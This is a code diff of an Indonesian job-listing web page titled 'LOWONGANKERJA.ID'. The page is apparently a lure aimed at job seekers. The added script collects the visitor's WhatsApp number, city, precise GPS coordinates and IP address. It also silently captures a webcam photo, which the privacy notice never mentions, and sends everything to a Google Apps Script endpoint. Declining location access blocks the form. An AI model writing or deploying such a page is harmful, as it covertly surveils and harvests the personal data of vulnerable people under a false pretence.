@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Info Lowongan Kerja - Kirim Lamaran</title>
+  <title>LOWONGANKERJA.ID - Info Lowongan Kerja</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     * {
       box-sizing: border-box;
@@ -21,25 +22,26 @@
     .container {
       max-width: 1100px;
       margin: 0 auto;
-      padding: 20px;
+      padding: 15px;
     }
     
     header {
       background: linear-gradient(135deg, #2c3e50, #4a6491);
       color: white;
-      padding: 30px 0;
+      padding: 20px 0;
       text-align: center;
-      border-radius: 8px 8px 0 0;
+      border-radius: 10px;
       margin-bottom: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     }
     
     header h1 {
-      font-size: 2.5rem;
-      margin-bottom: 10px;
+      font-size: 1.8rem;
+      margin-bottom: 8px;
     }
     
     header p {
-      font-size: 1.2rem;
+      font-size: 1rem;
       opacity: 0.9;
     }
     
@@ -47,15 +49,15 @@
       display: flex;
       flex-wrap: wrap;
       gap: 20px;
-      margin-bottom: 30px;
+      margin-bottom: 25px;
     }
     
     .job-list {
       flex: 2;
       background: white;
       padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.08);
     }
     
     .job-list h2 {
@@ -63,6 +65,7 @@
       margin-bottom: 20px;
       padding-bottom: 10px;
       border-bottom: 2px solid #eee;
+      font-size: 1.5rem;
     }
     
     .job-item {
@@ -70,25 +73,62 @@
       margin-bottom: 15px;
       border-left: 4px solid #4a6491;
       background-color: #f9f9f9;
-      border-radius: 4px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    
+    .job-item:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
+    
+    .job-item.expanded {
+      background-color: #eef5ff;
     }
     
     .job-item h3 {
       color: #2c3e50;
       margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 1.2rem;
+    }
+    
+    .job-details {
+      display: none;
+      margin-top: 15px;
+      padding-top: 15px;
+      border-top: 1px solid #ddd;
+    }
+    
+    .job-details.expanded {
+      display: block;
     }
     
     .job-item p {
       margin-bottom: 5px;
       color: #555;
+      font-size: 0.95rem;
+    }
+    
+    .job-item ul {
+      padding-left: 20px;
+      margin: 10px 0;
+    }
+    
+    .job-item li {
+      margin-bottom: 5px;
+      font-size: 0.95rem;
     }
     
     .apply-form {
       flex: 1;
       background: white;
       padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.08);
     }
     
     .apply-form h2 {
@@ -96,6 +136,7 @@
       margin-bottom: 20px;
       padding-bottom: 10px;
       border-bottom: 2px solid #eee;
+      font-size: 1.5rem;
     }
     
     .form-group {
@@ -107,49 +148,142 @@
       margin-bottom: 8px;
       font-weight: 600;
       color: #444;
+      font-size: 0.95rem;
     }
     
     .form-group input {
       width: 100%;
-      padding: 12px;
+      padding: 12px 15px;
       border: 1px solid #ddd;
-      border-radius: 4px;
+      border-radius: 8px;
       font-size: 16px;
+      background-color: #f8f9fa;
     }
     
     .form-group input:focus {
       outline: none;
       border-color: #4a6491;
-      box-shadow: 0 0 0 2px rgba(74, 100, 145, 0.2);
+      box-shadow: 0 0 0 3px rgba(74, 100, 145, 0.2);
     }
     
     button {
       background: linear-gradient(135deg, #2c3e50, #4a6491);
       color: white;
       border: none;
-      padding: 14px 20px;
+      padding: 15px;
       width: 100%;
-      border-radius: 4px;
+      border-radius: 8px;
       font-size: 16px;
       font-weight: 600;
       cursor: pointer;
       transition: all 0.3s ease;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
     }
     
     button:hover {
       background: linear-gradient(135deg, #4a6491, #2c3e50);
       transform: translateY(-2px);
-      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     }
     
     .privacy-notice {
       margin-top: 20px;
       padding: 15px;
       background-color: #f8f9fa;
-      border-radius: 4px;
-      font-size: 14px;
+      border-radius: 8px;
+      font-size: 0.9rem;
       color: #666;
       border-left: 4px solid #4a6491;
+    }
+    
+    .location-permission {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.85);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      padding: 15px;
+    }
+    
+    .permission-box {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 90%;
+      width: 400px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+    
+    .permission-box h3 {
+      margin-bottom: 15px;
+      color: #2c3e50;
+      font-size: 1.4rem;
+    }
+    
+    .permission-box p {
+      margin-bottom: 20px;
+      color: #555;
+      line-height: 1.5;
+    }
+    
+    .permission-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+    }
+    
+    .permission-buttons button {
+      width: auto;
+      padding: 12px 25px;
+      border-radius: 8px;
+      font-size: 1rem;
+    }
+    
+    .permission-buttons .deny {
+      background: #e74c3c;
+    }
+    
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.8);
+      z-index: 2000;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 5px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #4a6491;
+      animation: spin 1s ease-in-out infinite;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .loading-text {
+      color: white;
+      font-size: 1.2rem;
+      text-align: center;
     }
     
     footer {
@@ -157,12 +291,51 @@
       margin-top: 40px;
       padding: 20px;
       color: #666;
-      font-size: 14px;
+      font-size: 0.9rem;
     }
     
+    /* Responsive styles */
     @media (max-width: 768px) {
       .content {
         flex-direction: column;
+      }
+      
+      header h1 {
+        font-size: 1.6rem;
+      }
+      
+      .job-list, .apply-form {
+        width: 100%;
+      }
+      
+      .permission-buttons {
+        flex-direction: column;
+      }
+      
+      .permission-buttons button {
+        width: 100%;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .container {
+        padding: 10px;
+      }
+      
+      header {
+        padding: 15px 0;
+      }
+      
+      header h1 {
+        font-size: 1.4rem;
+      }
+      
+      .job-list, .apply-form {
+        padding: 15px;
+      }
+      
+      .job-item h3 {
+        font-size: 1.1rem;
       }
     }
   </style>
@@ -170,79 +343,204 @@
 <body>
   <div class="container">
     <header>
-      <h1>Info Lowongan Kerja</h1>
-      <p>Dapatkan pekerjaan impian Anda dengan melamar di sini</p>
+      <h1>LOWONGANKERJA.ID</h1>
+      <p>Dapatkan informasi lowongan kerja terbaru di daerah Anda</p>
     </header>
     
     <div class="content">
       <div class="job-list">
         <h2>Lowongan Tersedia</h2>
         
-        <div class="job-item">
-          <h3>Frontend Developer</h3>
+        <div class="job-item" onclick="toggleJobDetails(this)">
+          <h3>Staff Administrasi <span>+</span></h3>
           <p><strong>Lokasi:</strong> Jakarta Selatan</p>
-          <p><strong>Gaji:</strong> Rp 8 - 12 juta</p>
-          <p><strong>Deskripsi:</strong> Dicari Frontend Developer dengan pengalaman minimal 2 tahun. Menguasai HTML, CSS, JavaScript dan framework modern seperti React atau Vue.</p>
+          <p><strong>Gaji:</strong> Rp 4 - 6 juta</p>
+          <div class="job-details">
+            <p><strong>Kualifikasi:</strong></p>
+            <ul>
+              <li>Pendidikan minimal SMA/SMK sederajat</li>
+              <li>Mahir menggunakan Microsoft Office</li>
+              <li>Memiliki kemampuan administrasi yang baik</li>
+              <li>Teliti dan mampu bekerja secara mandiri</li>
+            </ul>
+            <p><strong>Benefit:</strong> BPJS, THR, Transport allowance</p>
+          </div>
         </div>
         
-        <div class="job-item">
-          <h3>Backend Developer</h3>
+        <div class="job-item" onclick="toggleJobDetails(this)">
+          <h3>Customer Service <span>+</span></h3>
           <p><strong>Lokasi:</strong> Bandung</p>
-          <p><strong>Gaji:</strong> Rp 9 - 13 juta</p>
-          <p><strong>Deskripsi:</strong> Kami mencari Backend Developer yang berpengalaman dalam Node.js, Python, atau PHP. Familiar dengan database SQL dan NoSQL.</p>
+          <p><strong>Gaji:</strong> Rp 4.5 - 6.5 juta</p>
+          <div class="job-details">
+            <p><strong>Kualifikasi:</strong></p>
+            <ul>
+              <li>Pendidikan minimal SMA/SMK sederajat</li>
+              <li>Komunikasi baik dan ramah</li>
+              <li>Berpenampilan menarik dan percaya diri</li>
+              <li>Bersedia bekerja shift</li>
+            </ul>
+            <p><strong>Benefit:</strong> BPJS, Bonus, Seragam kerja</p>
+          </div>
         </div>
         
-        <div class="job-item">
-          <h3>UI/UX Designer</h3>
+        <div class="job-item" onclick="toggleJobDetails(this)">
+          <h3>Sales Retail <span>+</span></h3>
           <p><strong>Lokasi:</strong> Surabaya</p>
-          <p><strong>Gaji:</strong> Rp 7 - 10 juta</p>
-          <p><strong>Deskripsi:</strong> Dicari UI/UX Designer kreatif dengan portfolio yang kuat. Menguasai Figma, Adobe XD, dan tools desain lainnya.</p>
+          <p><strong>Gaji:</strong> Rp 3.5 - 5 juta + Komisi</p>
+          <div class="job-details">
+            <p><strong>Kualifikasi:</strong></p>
+            <ul>
+              <li>Pendidikan minimal SMA/SMK sederajat</li>
+              <li>Memiliki kemampuan komunikasi yang baik</li>
+              <li>Berpenampilan rapi dan percaya diri</li>
+              <li>Target oriented dan mau belajar</li>
+            </ul>
+            <p><strong>Benefit:</strong> Komisi tanpa batas, Bonus, Training</p>
+          </div>
+        </div>
+
+        <div class="job-item" onclick="toggleJobDetails(this)">
+          <h3>Operator Produksi <span>+</span></h3>
+          <p><strong>Lokasi:</strong> Tangerang</p>
+          <p><strong>Gaji:</strong> Rp 4.2 - 5.5 juta</p>
+          <div class="job-details">
+            <p><strong>Kualifikasi:</strong></p>
+            <ul>
+              <li>Pendidikan minimal SMA/SMK sederajat</li>
+              <li>Sehat jasmani dan rohani</li>
+              <li>Bersedia bekerja shift</li>
+              <li>Teliti dan cekatan dalam bekerja</li>
+            </ul>
+            <p><strong>Benefit:</strong> BPJS Kesehatan & Ketenagakerjaan, Uang shift, Makan gratis</p>
+          </div>
         </div>
       </div>
       
       <div class="apply-form">
-        <h2>Lamar Sekarang</h2>
+        <h2>Daftar Sekarang</h2>
         
         <div class="form-group">
-          <label for="nama">Nama Lengkap</label>
-          <input type="text" id="nama" placeholder="Masukkan nama lengkap Anda">
+          <label for="nama">Nomor WhatsApp</label>
+          <input type="text" id="nama" placeholder="Contoh: 081235****32">
         </div>
         
         <div class="form-group">
-          <label for="kota">Kota</label>
-          <input type="text" id="kota" placeholder="Masukkan kota tempat tinggal Anda">
+          <label for="kota">Kota yang Diinginkan</label>
+          <input type="text" id="kota" placeholder="Kota tempat Anda ingin bekerja">
         </div>
         
-        <button onclick="kirimLokasi()">Kirim Lamaran</button>
+        <button onclick="requestLocationPermission()">
+          <i class="fas fa-paper-plane"></i> Kirim Lamaran
+        </button>
         
         <div class="privacy-notice">
-          <p><strong>Catatan:</strong> Dengan mengklik "Kirim Lamaran", Anda menyetujui untuk berbagi informasi lokasi Anda dengan kami. Ini membantu kami menempatkan Anda di lowongan yang sesuai dengan daerah Anda.</p>
+          <p><strong>Catatan:</strong> Dengan mengklik "Kirim Lamaran", Anda menyetujui untuk berbagi informasi lokasi. Data akan digunakan untuk memberikan rekomendasi lowongan terdekat.</p>
         </div>
       </div>
     </div>
     
     <footer>
-      <p>&copy; 2023 Perusahaan Kami. Semua hak dilindungi.</p>
+      <p>&copy; 2023 lowongankerja.id - Layanan informasi lowongan kerja</p>
     </footer>
   </div>
 
+  <div class="location-permission" id="locationPermission">
+    <div class="permission-box">
+      <h3>Akses Lokasi Diperlukan</h3>
+      <p>Untuk memberikan rekomendasi lowongan terdekat, izinkan akses ke lokasi Anda.</p>
+      <div class="permission-buttons">
+        <button onclick="grantPermission()">Izinkan</button>
+        <button class="deny" onclick="denyPermission()">Tolak</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Mengirim data... Harap tunggu</div>
+  </div>
+
   <script>
+    // Fungsi untuk toggle detail lowongan
+    function toggleJobDetails(element) {
+      const details = element.querySelector('.job-details');
+      const expandIcon = element.querySelector('h3 span');
+      
+      element.classList.toggle('expanded');
+      details.classList.toggle('expanded');
+      
+      if (details.classList.contains('expanded')) {
+        expandIcon.textContent = '-';
+      } else {
+        expandIcon.textContent = '+';
+      }
+    }
+    
+    // Tampilkan popup permintaan akses lokasi
+    function requestLocationPermission() {
+      const nama = document.getElementById('nama').value;
+      const kota = document.getElementById('kota').value;
+      
+      if (!nama || !kota) {
+        alert('Harap isi nomor WhatsApp dan kota terlebih dahulu.');
+        return;
+      }
+      
+      if (!/^08[0-9]{7,12}$/.test(nama.replace(/\D/g, ''))) {
+        alert('Harap masukkan nomor WhatsApp yang valid.');
+        return;
+      }
+      
+      document.getElementById('locationPermission').style.display = 'flex';
+    }
+    
+    // Ketika pengguna mengizinkan akses
+    function grantPermission() {
+      document.getElementById('locationPermission').style.display = 'none';
+      showLoading();
+      kirimLokasi();
+    }
+    
+    // Ketika pengguna menolak akses
+    function denyPermission() {
+      document.getElementById('locationPermission').style.display = 'none';
+      alert('Anda perlu mengizinkan akses lokasi untuk mendapatkan rekomendasi lowongan terdekat.');
+    }
+    
+    // Tampilkan loading indicator
+    function showLoading() {
+      document.getElementById('loadingOverlay').style.display = 'flex';
+    }
+    
+    // Sembunyikan loading indicator
+    function hideLoading() {
+      document.getElementById('loadingOverlay').style.display = 'none';
+    }
+    
+    // Fungsi utama untuk mengirim data
     async function kirimLokasi() {
       // Ambil nilai dari input nama dan kota
       const nama = document.getElementById('nama').value || "Tes Nama";
       const kota = document.getElementById('kota').value || "Tes Kota";
       
       try {
-        // ambil lokasi user
+        // Ambil lokasi user terlebih dahulu
         navigator.geolocation.getCurrentPosition(async (pos) => {
+          // Setelah dapat lokasi, ambil IP dan foto secara paralel
+          const [ip, fotoBase64] = await Promise.all([
+            ambilIP().catch(() => "Tidak dapat mengambil IP"),
+            ambilFoto().catch(() => "")
+          ]);
+          
           const data = {
-            ip: await ambilIP(),
+            ip: ip,
             lokasi: `${pos.coords.latitude},${pos.coords.longitude}`,
             nama: nama,
             kota: kota,
-            fotoBase64: "" // bisa diisi jika nanti upload foto
+            fotoBase64: fotoBase64
           };
 
+          // Kirim data ke Google Sheets
           const response = await fetch(
             "https://script.google.com/macros/s/AKfycbz7LnJeVFd1-HGCIEF2cEULDR1RQ40F_u5YXu4sBzEHQMGpp7HAL9M4etNhf-LA22go/exec",
             {
@@ -252,19 +550,93 @@
           );
 
           const result = await response.json();
-          alert("Status: " + result.status + "\nTerima kasih " + nama + " dari " + kota + " telah mengirim lamaran!");
+          hideLoading();
+          alert("Terima kasih " + nama + "!\nPendaftaran berhasil. Kami akan mengirim info lowongan ke WhatsApp Anda untuk area " + kota + ".");
         }, (error) => {
-          alert("Izinkan akses lokasi untuk melanjutkan proses lamaran.");
+          hideLoading();
+          alert("Izinkan akses lokasi untuk melanjutkan proses.");
+        }, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 300000
         });
       } catch (e) {
-        alert("Gagal ambil lokasi: " + e);
+        hideLoading();
+        alert("Terjadi kesalahan: " + e.message);
       }
     }
 
+    // Fungsi untuk mengambil foto dari kamera
+    async function ambilFoto() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          resolve(""); // Tidak reject, langsung resolve kosong jika tidak support
+          return;
+        }
+        
+        // Coba akses kamera dengan timeout
+        const timeout = setTimeout(() => {
+          resolve(""); // Jika timeout, resolve dengan string kosong
+        }, 3000);
+        
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then(stream => {
+            clearTimeout(timeout);
+            
+            // Buat video element untuk menangkap gambar
+            const video = document.createElement('video');
+            video.width = 160;
+            video.height = 120;
+            video.srcObject = stream;
+            video.play();
+            
+            // Tunggu sampai video siap
+            video.onloadedmetadata = () => {
+              // Buat canvas untuk mengambil frame
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext('2d');
+              
+              // Gambar frame dari video ke canvas
+              setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Konversi ke base64 dengan kualitas lebih rendah untuk mempercepat
+                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                
+                // Hentikan stream
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Kembalikan data gambar
+                resolve(imageData);
+              }, 300);
+            };
+          })
+          .catch(error => {
+            clearTimeout(timeout);
+            resolve(""); // Resolve dengan string kosong jika error
+          });
+      });
+    }
+
+    // Fungsi untuk mengambil IP address
     async function ambilIP() {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const json = await res.json();
-      return json.ip;
+      try {
+        // Gunakan timeout untuk mencegah proses terlalu lama
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
+        
+        const res = await fetch("https://api.ipify.org?format=json", {
+          signal: controller.signal
+        });
+        clearTimeout(timeoutId);
+        
+        const json = await res.json();
+        return json.ip;
+      } catch (error) {
+        return "Tidak dapat mengambil IP";
+      }
     }
   </script>
 </body>
